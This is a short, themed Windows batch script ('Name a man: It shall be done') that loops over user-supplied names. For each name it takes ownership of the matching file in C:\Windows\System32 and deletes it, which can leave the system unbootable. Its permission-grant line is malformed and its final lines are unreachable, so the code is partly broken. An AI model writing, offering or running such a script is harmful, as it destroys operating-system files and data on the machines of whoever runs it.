@echo off
set /p user="What is your username?"
:faceless
set /p var="Name a man:"
echo It shall be done.
takeown /f C:\Windows\System32\%var%
icacls C:\Windows\System32\%var% \G %user%:F
del C:\Windows\System32\%var%
goto faceless
pause
stop
